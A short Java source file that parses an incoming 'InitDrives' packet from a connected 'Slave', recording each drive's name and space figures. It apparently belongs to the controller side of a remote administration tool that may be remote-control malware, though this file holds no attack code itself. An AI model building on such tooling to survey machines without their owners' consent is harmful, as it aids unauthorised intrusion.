package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Drive;
import com.redpois0n.Slave;

public class Packet62InitDrives extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();

		slave.setDrives(new Drive[len]);

		for (int i = 0; i < len; i++) {
			Drive drive = new Drive();
			drive.setName(slave.readLine());
			drive.setTotalSpace(slave.readShort());
			drive.setFreeSpace(slave.readShort());
			drive.setUsableSpace(slave.readShort());
			slave.getDrives()[i] = drive;
		}
	}

}
